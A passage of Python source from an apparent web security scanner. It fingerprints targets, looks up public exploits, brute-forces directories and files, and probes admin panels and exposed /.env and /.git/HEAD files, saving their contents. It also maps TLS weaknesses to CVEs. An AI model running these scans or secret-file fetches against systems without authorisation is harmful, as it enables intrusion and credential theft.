            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            proc.communicate(timeout=60)
            _deregister_proc(proc)
            out.log_command("whatweb", cmd, ww_out)
            if ww_out.exists():
                # Security header names (from _SECURITY_HEADERS, defined further in this
                # module — resolved at call-time, not definition-time)
                _SEC_HDR_NAMES = {h[0] for h in _SECURITY_HEADERS}
                # Regex matching HTTP-header-style plugin names (e.g. X-Frame-Options, Via)
                _HDR_NAME_RE = re.compile(r'^[A-Z][a-zA-Z]*(?:-[A-Za-z]+)+$')
                # Plugins to skip entirely — noise or already handled by fracture-headers
                _SKIP_WW = {
                    "Script", "HTML", "Title", "Meta-Refresh", "IP", "Country",
                    "Email", "Cookies", "Open-Graph-Protocol", "HTML5",
                    "Bootstrap", "jQuery", "X-Powered-By", "Server", "HTTPServer",
                }
                # Track which security headers whatweb observed as present
                ww_found_sec_hdrs: set = set()

                for line in ww_out.read_text(encoding="utf-8", errors="replace").splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        records = json.loads(line)
                        if not isinstance(records, list):
                            records = [records]
                        for rec in records:
                            plugins = rec.get("plugins", {})
                            for pname, pdata in plugins.items():
                                if pname in _SKIP_WW:
                                    continue

                                # Known security header present — track and skip Tech finding
                                if pname in _SEC_HDR_NAMES:
                                    ww_found_sec_hdrs.add(pname)
                                    continue

                                # Uncommon-Headers plugin — WhatWeb packs all uncommon
                                # header names as a comma-separated list inside a single
                                # string entry.  Split on commas first, then on ':' for
                                # any items that carry a value, and emit one finding each.
                                if pname == "Uncommon-Headers":
                                    for hdr_val in pdata.get("string", []):
                                        for _raw_item in hdr_val.split(","):
                                            _raw_item = _raw_item.strip()
                                            if not _raw_item:
                                                continue
                                            _hv_parts = _raw_item.split(":", 1)
                                            hdr_name  = _hv_parts[0].strip()
                                            hdr_value = _hv_parts[1].strip() if len(_hv_parts) > 1 else ""
                                            if not hdr_name:
                                                continue
                                            out.add_finding(
                                                title=f"Unknown Header Identified: {hdr_name}",
                                                url=url, port=target["port"], risk="INFO",
                                                description=(
                                                    f"An uncommon or non-standard HTTP header "
                                                    f"'{hdr_name}' was observed in the response."
                                                    + (f" Value: {hdr_value}" if hdr_value else "")
                                                ),
                                                output=f"Header: {hdr_name}"
                                                       + (f"\nValue: {hdr_value}" if hdr_value else ""),
                                                sources="whatweb", service=target["scheme"],
                                                output_file=str(ww_out),
                                                owasp="A05:2025 Security Misconfiguration",
                                                nist="CM-7",
                                                remediation=(
                                                    "Review the header for necessity; "
                                                    "remove non-standard headers if not required."
                                                ),
                                            )
                                    continue

                                versions = pdata.get("version", [])
                                version  = versions[0] if versions else ""

                                # Header-like plugin name (not a known security header)
                                if _HDR_NAME_RE.match(pname):
                                    out.add_finding(
                                        title=f"Unknown Header Identified: {pname}",
                                        url=url, port=target["port"], risk="INFO",
                                        description=(
                                            f"An unrecognised HTTP header '{pname}' "
                                            f"was observed in the response."
                                            + (f" Value: {version}" if version else "")
                                        ),
                                        output=(f"Header: {pname}"
                                                + (f"\nValue: {version}" if version else "")),
                                        sources="whatweb", service=target["scheme"],
                                        output_file=str(ww_out),
                                        owasp="A05:2025 Security Misconfiguration",
                                        nist="CM-7",
                                        remediation=(
                                            "Review the header for necessity; "
                                            "remove non-standard headers if not required."
                                        ),
                                    )
                                    continue

                                # Standard technology finding
                                _ww_versions.append((pname, version))
                                out.add_finding(
                                    title=(f"Technology Identified: {pname} {version}".strip()
                                           if version else f"Technology Identified: {pname}"),
                                    url=url, port=target["port"], risk="INFO",
                                    description=(
                                        f"whatweb identified {pname}"
                                        f"{' ' + version if version else ''} at {url}."
                                    ),
                                    output=(f"Plugin: {pname}"
                                            + (f"\nVersion: {version}" if version else "")),
                                    sources="whatweb", service=target["scheme"],
                                    output_file=str(ww_out),
                                    owasp="A06:2025 Vulnerable and Outdated Components",
                                    nist="CM-7",
                                    remediation=(
                                        "Ensure all identified technologies are up to date "
                                        "and properly configured."
                                    ),
                                )
                    except Exception:
                        pass

                # Emit Missing Security Header findings for headers absent from whatweb output
                for _hdr_name, _hdr_risk, _unused, _hdr_desc, _hdr_nist, _hdr_remed \
                        in _SECURITY_HEADERS:
                    if _hdr_name == "Strict-Transport-Security" and not target["is_https"]:
                        continue
                    if _hdr_name not in ww_found_sec_hdrs:
                        out.add_finding(
                            title=f"Missing Security Header: {_hdr_name}",
                            url=url, port=target["port"], risk=_hdr_risk,
                            description=_hdr_desc,
                            output=f"Missing: {_hdr_name}",
                            affected=_hdr_name,
                            sources="whatweb", service=target["scheme"],
                            output_file=str(ww_out),
                            owasp="A05:2025 Security Misconfiguration",
                            nist=_hdr_nist,
                            remediation=_hdr_remed,
                        )
        except Exception as e:
            out.log_error("whatweb", cmd, str(e))
    else:
        vc.log("[recon] whatweb not found — skipping tech fingerprint", "WARNING")

    # ── Exploit lookup (searchsploit) ─────────────────────────────────────────
    # Build search terms from detected server header, CMS, and whatweb results.
    searchsploit = _find_tool("searchsploit")
    if searchsploit:
        _ss_terms: list = []
        _HAS_VER = re.compile(r'\d+\.\d+')
        if server_hdr:
            _sw_name, _sw_ver = _parse_software(server_hdr)
            if _sw_ver and _HAS_VER.search(_sw_ver):
                _ss_terms.append(f"{_sw_name} {_sw_ver}")
        if powered_by:
            _pw_name, _pw_ver = _parse_software(powered_by)
            if _pw_ver and _HAS_VER.search(_pw_ver):
                _ss_terms.append(f"{_pw_name} {_pw_ver}")
        for _pname, _pver in _ww_versions:
            if _pver and _HAS_VER.search(_pver):
                _ss_terms.append(f"{_pname} {_pver}")
        seen_ss: set = set()
        for term in _ss_terms[:5]:   # cap at 5 queries
            term = term.strip()
            if not term or term in seen_ss:
                continue
            seen_ss.add(term)
            ss_safe = re.sub(r'[^\w\-.]', '_', term)[:60]
            ss_out  = out.output_path(phase, f"searchsploit_{ss_safe}")
            cmd = [searchsploit, "--json", term]
            vc.log(f"[recon] searchsploit: {term!r}", "INFO")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                _register_proc(proc)
                stdout_ss, _ = proc.communicate(timeout=30)
                _deregister_proc(proc)
                ss_out.write_text(stdout_ss, encoding="utf-8", errors="replace")
                out.log_command("searchsploit", cmd, ss_out)
                ss_data    = json.loads(stdout_ss)
                exploits   = (ss_data.get("RESULTS_EXPLOIT", [])
                              + ss_data.get("RESULTS_SHELLCODE", []))
                if exploits:
                    titles_list = [e.get("Title", "") for e in exploits[:5]]
                    out.add_finding(
                        title=f"Public Exploit Available: {term}",
                        url=url, port=target["port"], risk="HIGH",
                        description=(
                            f"{len(exploits)} public exploit(s) found in ExploitDB for "
                            f"'{term}'. Review and patch before exposure."
                        ),
                        output="\n".join(f"- {t}" for t in titles_list),
                        sources="searchsploit", service=target["scheme"],
                        output_file=str(ss_out),
                        affected=url,
                        owasp="A06:2025 Vulnerable and Outdated Components", nist="SI-2",
                        remediation=f"Update or patch {term} to address known vulnerabilities.",
                    )
                    vc.log(f"[recon] searchsploit: {len(exploits)} hit(s) for {term!r}", "SUCCESS")
            except Exception as e:
                out.log_error("searchsploit", cmd, str(e))
    else:
        vc.log("[recon] searchsploit not found — skipping exploit lookup", "WARNING")

    vc.status(phase, "Recon", "running", "robots.txt/sitemap", 2, 10)
    for rpath in ["/robots.txt", "/sitemap.xml"]:
        try:
            r = sess.get(url + rpath, timeout=timeout)
            if r.status_code == 200 and len(r.text) > 10 \
                    and not _is_wildcard_match(r, wc_baseline):
                out_f = out.output_path(phase, rpath.lstrip("/").replace(".", "_"))
                out_f.write_text(r.text, encoding="utf-8")
                vc.log(f"[recon] Found {rpath} ({len(r.text)} bytes)", "SUCCESS")
                if rpath == "/robots.txt":
                    _raw_disallowed = re.findall(r'(?i)disallow:\s*(\S+)', r.text)
                    # Skip catch-all entries (/, /*, *) — not specific sensitive paths
                    disallowed = [p for p in _raw_disallowed
                                  if p not in ("/", "/*", "*")]
                    if disallowed:
                        out.add_finding(
                            title="Sensitive Paths Disclosed in robots.txt",
                            url=url + rpath, port=target["port"], risk="INFO",
                            description=f"robots.txt disallows {len(disallowed)} path(s).",
                            output=r.text[:2000], sources="fracture-recon",
                            service=target["scheme"], output_file=str(out_f),
                            affected="\n".join(disallowed[:20]),
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation="Review robots.txt for sensitive path disclosure.",
                        )
        except Exception:
            pass

    vc.status(phase, "Recon", "running", "Admin panel detection", 3, 10)
    for apath in _ADMIN_PATHS:
        try:
            r = sess.get(url + apath, timeout=timeout, allow_redirects=False)
            if r.status_code in (200, 301, 302, 401, 403):
                # Wildcard baseline check: skip if response matches the catch-all pattern
                if _is_wildcard_match(r, wc_baseline):
                    continue
                # HTTP 200: panel accessible without authentication (CWE-306) → HIGH
                # HTTP 401/403/redirect: panel exists but access controls are enforced → MEDIUM
                _admin_risk = "HIGH" if r.status_code == 200 else "MEDIUM"
                _admin_desc = (
                    f"Administrative interface accessible without authentication at {apath} "
                    f"(HTTP {r.status_code}). CWE-306 (Missing Authentication for Critical Function)."
                    if r.status_code == 200 else
                    f"Administrative interface found at {apath} (HTTP {r.status_code}). "
                    f"Panel exists; authentication controls are enforced."
                )
                _admin_safe = apath.lstrip("/").replace("/", "_").replace(".", "_") or "root"
                _admin_out  = out.output_path(phase, f"admin_{_admin_safe}")
                _admin_out.write_text(
                    f"GET {apath} HTTP/1.1\nHost: {target['hostname']}\n\n"
                    f"HTTP {r.status_code}\n{r.text[:5000]}",
                    encoding="utf-8",
                )
                out.add_finding(
                    title="Admin Panel Exposed",
                    url=url + apath, port=target["port"], risk=_admin_risk,
                    description=_admin_desc,
                    output=f"GET {apath} → {r.status_code}",
                    sources="fracture-recon", service=target["scheme"],
                    affected=url + apath, output_file=str(_admin_out),
                    owasp="A05:2025 Security Misconfiguration", nist="AC-3",
                    remediation="Restrict admin interfaces by IP allowlist or VPN.",
                )
                vc.log(f"[recon] Admin panel: {apath} → {r.status_code}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Recon", "running", "Common paths probe", 4, 10)
    for cpath in _COMMON_PATHS:
        try:
            r = sess.get(url + cpath, timeout=timeout, allow_redirects=False)
            if r.status_code == 200 and cpath in ("/.git/HEAD", "/.env") \
                    and not _is_wildcard_match(r, wc_baseline):
                _cp_safe = cpath.lstrip("/").replace("/", "_").replace(".", "_")
                _cp_out  = out.output_path(phase, f"sensitive_path_{_cp_safe}")
                _cp_out.write_text(
                    f"GET {cpath} HTTP/1.1\nHost: {target['hostname']}\n\n"
                    f"HTTP {r.status_code}\n{r.text[:5000]}",
                    encoding="utf-8",
                )
                out.add_finding(
                    title=f"Sensitive Path Accessible: {cpath}",
                    url=url + cpath, port=target["port"], risk="CRITICAL",
                    description=f"The path {cpath} is publicly accessible.",
                    output=f"GET {cpath} → {r.status_code}\n{r.text[:500]}",
                    sources="fracture-recon", service=target["scheme"],
                    affected=url + cpath, output_file=str(_cp_out),
                    owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                    remediation=f"Block public access to {cpath}.",
                )
        except Exception:
            pass

    vc.status(phase, "Recon", "running", "Directory discovery", 5, 10)
    gobuster = _find_tool("gobuster")
    wordlist = _find_wordlist(
        "Discovery/Web-Content/raft-large-directories.txt",
        cfg.get("gobuster_wordlist", ""),
    )
    out_f    = out.output_path(phase, "gobuster_" + target["hostname"])
    if wc_baseline is not None:
        vc.log("[recon] Skipping directory brute-force (wildcard detected)", "WARNING")
    elif gobuster and Path(wordlist).exists():
        cmd = [gobuster, "dir", "-u", url, "-w", wordlist, "-t", "30",
               "-q", "-k", "-o", str(out_f)]
        vc.log("[recon] Running gobuster ...", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            _register_proc(proc)
            _, gob_err = proc.communicate(timeout=300)
            _deregister_proc(proc)
            if gob_err:
                vc.log(f"[recon] gobuster stderr: {gob_err[:500]}", "WARNING")
            out.log_command("gobuster", cmd, out_f)
        except Exception as e:
            out.log_error("gobuster", cmd, str(e))
    else:
        if gobuster:
            vc.log(f"[recon] gobuster found but wordlist missing: {wordlist}", "WARNING")
        else:
            vc.log("[recon] gobuster not found — probing top paths", "WARNING")
        found = []
        for mpath in _TOP_200_PATHS:
            try:
                r = sess.get(url + mpath, timeout=timeout, allow_redirects=False)
                if r.status_code in (200, 301, 302, 403):
                    if not _is_wildcard_match(r, wc_baseline):
                        found.append(f"{mpath} [{r.status_code}]")
            except Exception:
                pass
        if found:
            out_f.write_text("\n".join(found), encoding="utf-8")

    # feroxbuster — recursive directory discovery (supplements gobuster)
    feroxbuster = _find_tool("feroxbuster")
    if wc_baseline is None and feroxbuster and Path(wordlist).exists():
        fer_out = out.output_path(phase, "feroxbuster_" + target["hostname"])
        cmd = [
            feroxbuster, "--url", url, "--wordlist", wordlist,
            "--depth", "2", "--threads", "30", "--quiet",
            "--status-codes", "200,204,301,302,307,401,403",
            "--output", str(fer_out), "--insecure",
            "--auto-tune",
        ]
        vc.log("[recon] Running feroxbuster ...", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            proc.communicate(timeout=300)
            _deregister_proc(proc)
            out.log_command("feroxbuster", cmd, fer_out)
        except Exception as e:
            out.log_error("feroxbuster", cmd, str(e))
    elif feroxbuster and wc_baseline is None:
        vc.log(f"[recon] feroxbuster found but wordlist missing: {wordlist}", "WARNING")

    # Second pass — raft-large-files.txt (finds files alongside directories)
    vc.status(phase, "Recon", "running", "File discovery", 6, 10)
    wordlist_files = _find_wordlist("raft-large-files.txt")
    if wc_baseline is not None:
        vc.log("[recon] Skipping file brute-force (wildcard detected)", "WARNING")
    elif Path(wordlist_files).exists():
        if gobuster:
            gob_files_out = out.output_path(phase, "gobuster_files_" + target["hostname"])
            cmd = [gobuster, "dir", "-u", url, "-w", wordlist_files, "-t", "30",
                   "-q", "-k", "-o", str(gob_files_out)]
            vc.log("[recon] Running gobuster (files) ...", "INFO")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                _register_proc(proc)
                _, gob_err = proc.communicate(timeout=300)
                _deregister_proc(proc)
                if gob_err:
                    vc.log(f"[recon] gobuster (files) stderr: {gob_err[:500]}", "WARNING")
                out.log_command("gobuster", cmd, gob_files_out)
            except Exception as e:
                out.log_error("gobuster", cmd, str(e))
        if feroxbuster:
            fer_files_out = out.output_path(phase, "feroxbuster_files_" + target["hostname"])
            cmd = [
                feroxbuster, "--url", url, "--wordlist", wordlist_files,
                "--depth", "2", "--threads", "30", "--quiet",
                "--status-codes", "200,204,301,302,307,401,403",
                "--output", str(fer_files_out), "--insecure",
                "--auto-tune",
            ]
            vc.log("[recon] Running feroxbuster (files) ...", "INFO")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                _register_proc(proc)
                proc.communicate(timeout=300)
                _deregister_proc(proc)
                out.log_command("feroxbuster", cmd, fer_files_out)
            except Exception as e:
                out.log_error("feroxbuster", cmd, str(e))
    else:
        vc.log(f"[recon] file wordlist missing: {wordlist_files} — skipping files pass", "WARNING")

    vc.status(phase, "Recon", "running", "Directory listing check", 7, 10)
    try:
        r = sess.get(url + "/", timeout=timeout)
        if re.search(r'Index of /|Directory listing|<title>Index of', r.text, re.I):
            _dl_out = out.output_path(phase, "dir_listing_" + target["hostname"])
            _dl_out.write_text(r.text[:10000], encoding="utf-8")
            out.add_finding(
                title="Directory Listing Enabled",
                url=url + "/", port=target["port"], risk="MEDIUM",
                description="Directory listing is enabled, potentially exposing sensitive files.",
                output=r.text[:500], sources="fracture-recon",
                service=target["scheme"], output_file=str(_dl_out),
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                remediation="Disable directory listing (e.g. Options -Indexes for Apache).",
            )
    except Exception:
        pass

    vc.status(phase, "Recon", "running", "WordPress scan", 8, 10)
    if "WordPress" in detected_cms:
        wpscan = _find_tool("wpscan")
        if wpscan:
            wp_out = out.output_path(phase, "wpscan_" + target["hostname"])
            wps_cmd = [wpscan, "--url", url, "--no-banner",
                       "-o", str(wp_out), "--format", "json"]
            tok = cfg.get("wpscan_token", "")
            if tok:
                wps_cmd += ["--api-token", tok]
            vc.log("[recon] Running wpscan ...", "INFO")
            try:
                proc = _popen(wps_cmd, stdout=subprocess.PIPE,
                              stderr=subprocess.DEVNULL, text=True)
                _register_proc(proc)
                proc.communicate(timeout=300)
                _deregister_proc(proc)
                out.log_command("wpscan", wps_cmd, wp_out)
                if wp_out.exists():
                    try:
                        wpd = json.loads(wp_out.read_text(encoding="utf-8"))
                        ver = wpd.get("version", {}).get("number", "")
                        if ver:
                            out.add_finding(
                                title="WordPress Version Detected",
                                url=url, port=target["port"], risk="INFO",
                                description=f"WordPress version {ver} detected.",
                                output=f"Version: {ver}", sources="wpscan",
                                service=target["scheme"], output_file=str(wp_out),
                                owasp="A06:2025 Vulnerable and Outdated Components",
                                nist="SI-2",
                                remediation="Keep WordPress up to date.",
                            )
                        for vuln in wpd.get("vulnerabilities", []):
                            out.add_finding(
                                title=f"WordPress Vulnerability: {vuln.get('title','Unknown')}",
                                url=url, port=target["port"], risk="HIGH",
                                description=vuln.get("title", ""),
                                cves=",".join(vuln.get("references", {}).get("cve", [])),
                                sources="wpscan", service=target["scheme"],
                                output_file=str(wp_out),
                                owasp="A06:2025 Vulnerable and Outdated Components",
                                nist="SI-2",
                                remediation="Apply available WordPress patches.",
                            )
                    except Exception:
                        pass
            except Exception as e:
                out.log_error("wpscan", wps_cmd, str(e))

    vc.status(phase, "Recon", "complete", "Done", 10, 10)
    vc.log("[recon] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Endpoint tools helpers (used after recon + crawl)
# ─────────────────────────────────────────────

def _parse_gobuster_output(filepath: Path, base_url: str) -> list:
    """Extract discovered URLs from a gobuster -q output file."""
    urls  = []
    base  = base_url.rstrip("/")
    for line in filepath.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # Redirect target takes priority: /path (Status: 301) [--> http://host/path/]
        m = re.search(r'-->\s*(https?://[^\]\s]+)', line)
        if m:
            urls.append(m.group(1).rstrip("/\\"))
            continue
        # Otherwise extract the leading path token
        m = re.match(r'(/\S+)', line)
        if m:
            urls.append(f"{base}{m.group(1)}")
    return urls


def _parse_feroxbuster_output(filepath: Path) -> list:
    """Extract discovered URLs from a feroxbuster output file."""
    urls = []
    for line in filepath.read_text(encoding="utf-8", errors="replace").splitlines():
        m = re.search(r'(https?://\S+)', line.strip())
        if m:
            urls.append(m.group(1).rstrip("/\\"))
    return urls


def _capture_screenshot_to(ep_url: str, out_path: Path,
                            target: dict, cfg: dict) -> bool:
    """Take a headless screenshot of ep_url and save to out_path.
    Returns True on success."""
    if not _check_selenium():
        return False
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        opts = Options()
        opts.add_argument("--headless=new")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--disable-gpu")
        opts.add_argument("--ignore-certificate-errors")
        opts.add_argument("--window-size=1280,800")
        opts.add_experimental_option("excludeSwitches", ["enable-logging"])
        chrome_bin = _find_chrome_binary()
        if chrome_bin:
            opts.binary_location = chrome_bin
        hostname = target.get("hostname", "")
        _ip      = target.get("ip")
        if not _ip and hostname:
            try:
                _ip = socket.gethostbyname(hostname)
            except Exception:
                _ip = None
        if hostname and _ip and _ip != hostname:
            opts.add_argument(f"--host-resolver-rules=MAP {hostname} {_ip}")
        svc    = _build_chrome_service()
        driver = webdriver.Chrome(service=svc, options=opts)
        try:
            driver.set_page_load_timeout(15)
            try:
                driver.get(ep_url)
            except Exception:
                pass
            total_h = driver.execute_script(
                "return Math.max("
                "  document.body.scrollHeight,"
                "  document.documentElement.scrollHeight"
                ")"
            )
            driver.set_window_size(1280, max(800, int(total_h)))
            driver.save_screenshot(str(out_path))
            return True
        finally:
            try:
                driver.quit()
            except Exception:
                pass
    except Exception:
        return False


def _phase_endpoint_tools(
    discovered_urls: list, target: dict, cfg: dict, pm: ProgressManager,
    out: OutputManager, sess: requests.Session,
) -> None:
    """Run screenshot, page crawl, and directory brute-force against each
    endpoint discovered by recon/crawl phases.  Capped to avoid runaway scans.
    """
    if not discovered_urls:
        return

    base_url     = target["url"].rstrip("/")
    timeout      = cfg.get("timeout", 10)
    max_ep       = cfg.get("max_endpoint_scan", 15)
    gobuster     = _find_tool("gobuster")
    feroxbuster  = _find_tool("feroxbuster")
    wordlist_dir = _find_wordlist(
        "Discovery/Web-Content/raft-large-directories.txt",
        cfg.get("gobuster_wordlist", ""),
    )
    wordlist_file = _find_wordlist("raft-large-files.txt")

    # Deduplicate, exclude base URL, cap count
    seen = {base_url}
    endpoints: list = []
    for u in discovered_urls:
        u = u.rstrip("/")
        if u and u not in seen:
            seen.add(u)
            endpoints.append(u)
            if len(endpoints) >= max_ep:
                break

    if not endpoints:
        return

    vc.log(f"[endpoint_tools] Processing {len(endpoints)} discovered endpoint(s)", "INFO")
    save_dir = out.root / "recon"
    save_dir.mkdir(parents=True, exist_ok=True)

    for idx, ep_url in enumerate(endpoints):
        ep_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', ep_url.replace("://", "_"))[:50]
        vc.status("endpoint_tools", "Endpoint Tools", "running",
                  f"Endpoint {idx + 1}/{len(endpoints)}", idx, len(endpoints))
        vc.log(f"[endpoint_tools] {ep_url}", "INFO")

        # ── Screenshot ──────────────────────────────────────────────────────
        ep_shot = save_dir / f"screenshot_{ep_safe}.png"
        if _capture_screenshot_to(ep_url, ep_shot, target, cfg):
            out.add_finding(
                title="Web Screenshot Captured",
                url=ep_url, port=target["port"], risk="INFO",
                description=f"A screenshot of discovered endpoint {ep_url} was captured.",
                output=f"Saved: {ep_shot.name}",
                sources="fracture-screenshot", service=target["scheme"],
                output_file=str(ep_shot),
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                remediation="Review screenshot for exposed sensitive content.",
            )
            vc.log(f"[endpoint_tools] Screenshot: {ep_shot.name}", "SUCCESS")

        # ── Single-page crawl ────────────────────────────────────────────────
        page_data = _crawl_page(ep_url, sess, timeout, base_url)
        if not page_data.get("error"):
            ep_crawl_out = out.output_path("crawl", f"crawl_ep_{ep_safe}")
            ep_crawl_out.write_text(
                json.dumps({
                    "endpoint": ep_url,
                    "links": page_data.get("links", [])[:200],
                    "forms": page_data.get("forms", [])[:50],
                }, indent=2),
                encoding="utf-8",
            )
            for link in page_data.get("links", []):
                if _INTERESTING_PATH_RE.search(link):
                    out.add_finding(
                        title="Interesting Endpoint Discovered",
                        url=link, port=target["port"], risk="INFO",
                        description=f"Potentially sensitive endpoint found while crawling {ep_url}: {link}",
                        sources="fracture-crawl", service=target["scheme"],
                        affected=link, output_file=str(ep_crawl_out),
                        owasp="A04:2025 Insecure Design", nist="CM-7",
                        remediation="Review this endpoint for access controls.",
                    )

        # ── Directory brute-force ────────────────────────────────────────────
        # Probe the endpoint itself for wildcard behaviour before brute-forcing
        ep_wc = _detect_wildcard(ep_url, sess, timeout)
        if ep_wc is not None:
            vc.log(f"[endpoint_tools] Wildcard detected on {ep_url} — skipping brute-force", "WARNING")
        elif gobuster and Path(wordlist_dir).exists():
            ep_gob = out.output_path("recon", f"gobuster_ep_{ep_safe}")
            cmd = [gobuster, "dir", "-u", ep_url, "-w", wordlist_dir,
                   "-t", "20", "-q", "-k", "-o", str(ep_gob)]
            vc.log(f"[endpoint_tools] gobuster on {ep_url}", "INFO")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                _register_proc(proc)
                _, gob_err = proc.communicate(timeout=180)
                _deregister_proc(proc)
                if gob_err:
                    vc.log(f"[endpoint_tools] gobuster stderr: {gob_err[:500]}", "WARNING")
                out.log_command("gobuster", cmd, ep_gob)
            except Exception as e:
                out.log_error("gobuster", cmd, str(e))

        if ep_wc is None and gobuster and Path(wordlist_file).exists():
            ep_gob_f = out.output_path("recon", f"gobuster_ep_files_{ep_safe}")
            cmd = [gobuster, "dir", "-u", ep_url, "-w", wordlist_file,
                   "-t", "20", "-q", "-k", "-o", str(ep_gob_f)]
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                _register_proc(proc)
                _, gob_err = proc.communicate(timeout=180)
                _deregister_proc(proc)
                if gob_err:
                    vc.log(f"[endpoint_tools] gobuster (files) stderr: {gob_err[:500]}", "WARNING")
                out.log_command("gobuster", cmd, ep_gob_f)
            except Exception as e:
                out.log_error("gobuster", cmd, str(e))

        if ep_wc is None and feroxbuster and Path(wordlist_dir).exists():
            ep_fer = out.output_path("recon", f"feroxbuster_ep_{ep_safe}")
            cmd = [feroxbuster, "--url", ep_url, "--wordlist", wordlist_dir,
                   "--depth", "1", "--threads", "20", "--quiet",
                   "--status-codes", "200,204,301,302,307,401,403",
                   "--output", str(ep_fer), "--insecure", "--auto-tune"]
            vc.log(f"[endpoint_tools] feroxbuster on {ep_url}", "INFO")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                _register_proc(proc)
                proc.communicate(timeout=180)
                _deregister_proc(proc)
                out.log_command("feroxbuster", cmd, ep_fer)
            except Exception as e:
                out.log_error("feroxbuster", cmd, str(e))

    vc.status("endpoint_tools", "Endpoint Tools", "complete", "Done",
              len(endpoints), len(endpoints))
    vc.log("[endpoint_tools] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 1: TLS
# ─────────────────────────────────────────────
_TLS_VULN_PATTERNS = {
    # Aligned with Scattershot3 finding titles for cross-tool deduplication
    # Risk levels based on NVD CVSS scores and pentest industry consensus.
    "Deprecated Protocol Enabled: SSLv2":   (re.compile(r'SSLv2\s+enabled|Accepted\s+SSLv2', re.I),   "CRITICAL", "CVE-2016-0800"),
    "Deprecated Protocol Enabled: SSLv3":   (re.compile(r'SSLv3\s+enabled|Accepted\s+SSLv3', re.I),   "HIGH",     "CVE-2014-3566"),
    # TLSv1.0: MEDIUM — BEAST (CVE-2011-3389, CVSS 4.3) is largely mitigated by browser 1/n-1 splitting;
    # non-trivially exploitable in practice. PCI DSS prohibits it post-2018. CWE-326.
    "Deprecated Protocol Enabled: TLSv1.0": (re.compile(r'TLSv1\.0\s+enabled|Accepted\s+TLSv1\b', re.I), "MEDIUM", "CVE-2011-3389"),
    # TLSv1.1: MEDIUM — deprecated per RFC 8996 (2021); no forward secrecy; SHA-1 integrity.
    # No single exploited CVE but formally deprecated and prohibited by PCI DSS. CWE-326.
    "Deprecated Protocol Enabled: TLSv1.1": (re.compile(r'TLSv1\.1\s+enabled|Accepted\s+TLSv1\.1', re.I), "MEDIUM", ""),
    # RC4: MEDIUM — statistical bias (CVE-2013-2566 CVSS 4.3); Bar Mitzvah attack (CVE-2015-2808 CVSS 4.3).
    # RFC 7465 prohibits RC4 in TLS. CWE-327.
    "Weak Cipher Identified: RC4":          (re.compile(r'\bRC4\b', re.I),          "MEDIUM",   "CVE-2013-2566, CVE-2015-2808"),
    "Weak Cipher Identified: NULL":         (re.compile(r'NULL\s+Cipher|NULL-', re.I), "CRITICAL", ""),
    # EXPORT: MEDIUM — FREAK attack (CVE-2015-0204 CVSS 4.3); requires active MITM. CWE-326.
    "Weak Cipher Identified: EXPORT":       (re.compile(r'\bEXPORT\b', re.I),       "MEDIUM",   "CVE-2015-0204"),
    # DES: MEDIUM — SWEET32 birthday attack on 64-bit block ciphers (CVE-2016-2183). CWE-326.
    "Weak Cipher Identified: DES":          (re.compile(r'\bDES\b(?!-CBC3)', re.I), "MEDIUM",   "CVE-2016-2183"),
    "Heartbleed (CVE-2014-0160) Vulnerability Detected":
                                            (re.compile(r'heartbleed|VULNERABLE.*heartbleed', re.I), "CRITICAL", "CVE-2014-0160"),
    "SSL/TLS Vulnerability: POODLE":        (re.compile(r'POODLE|VULNERABLE.*poodle', re.I),  "HIGH",   "CVE-2014-3566"),
    "SSL/TLS Vulnerability: BEAST":         (re.compile(r'BEAST|VULNERABLE.*beast', re.I),    "MEDIUM", "CVE-2011-3389"),
    "SSL/TLS Vulnerability: CRIME":         (re.compile(r'CRIME|VULNERABLE.*crime', re.I),    "HIGH",   "CVE-2012-4929"),
    # DROWN: HIGH — cross-protocol Bleichenbacher oracle via SSLv2 decrypts TLS sessions
    # (CVE-2016-0800 CVSS v3 5.9 MEDIUM; pentest consensus HIGH given C:H impact). CWE-310.
    "SSL/TLS Vulnerability: DROWN":         (re.compile(r'DROWN|VULNERABLE.*drown', re.I),    "HIGH",   "CVE-2016-0800"),
    "SSL/TLS Vulnerability: LOGJAM":        (re.compile(r'LOGJAM|VULNERABLE.*logjam', re.I),  "HIGH",   "CVE-2015-4000"),
    "SSL/TLS Vulnerability: FREAK":         (re.compile(r'FREAK|VULNERABLE.*freak', re.I),    "MEDIUM", "CVE-2015-0204"),
    "SSL/TLS Vulnerability: SWEET32":       (re.compile(r'SWEET32|3DES.*cipher|DES-CBC3', re.I), "MEDIUM", "CVE-2016-2183"),
    "SSL/TLS Vulnerability: LUCKY13":       (re.compile(r'LUCKY13|lucky13', re.I),            "MEDIUM", "CVE-2013-0169"),
    # Self-Signed: MEDIUM — eliminates PKI trust chain, enabling MITM; requires attacker positioning.
    # CWE-295 (Improper Certificate Validation), CWE-296.
    "SSL/TLS Certificate: Self-Signed":     (re.compile(r'self.signed|Self signed', re.I),    "MEDIUM", ""),
